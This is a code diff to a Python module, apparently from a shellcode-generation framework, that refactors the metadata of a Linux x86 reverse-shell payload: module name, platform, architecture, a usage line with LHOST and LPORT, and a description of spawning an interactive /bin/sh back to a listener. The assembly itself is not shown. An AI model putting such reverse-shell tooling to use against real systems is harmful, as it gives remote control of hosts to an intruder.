@@ -10,9 +10,29 @@ import binascii
 
 class Shellcode():
 
-    author      = "wetw0rk"
-    description = "Linux (x86) SH Reverse Shell"
-    example_run = f"{sys.argv[0]} -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=42 -f c"
+    name = "Linux (x86) SH Reverse Shell"
+
+    module = "linux/x86/shell_reverse_tcp"
+
+    example_run = f"{sys.argv[0]} -p {module} LHOST=125.0.0.1 LPORT=42 -f c"
+
+    platform = "Linux"
+
+    arch = "x86"
+    
+    ring = 3
+
+    author = ["wetw0rk"]
+
+    tested_platforms = ["Kali Linux"]
+
+    summary = "TCP based reverse shell over IPV4 which returns an interactive /bin/sh"
+    summary += " session (Linux x86)"
+
+    description = """
+    Simple reverse shellcode that will spawn a connection back to a listening tcp
+    server. Connection is made via TCP over IPV4.
+    """
 
     arguments = {}
 
@@ -41,7 +61,7 @@ class Shellcode():
         else:
             lport = argv_dict["LPORT"]
 
-        sc_builder = Assembler('x86')
+        sc_builder = Assembler(Shellcode.arch)
 
         source_code = (
         """
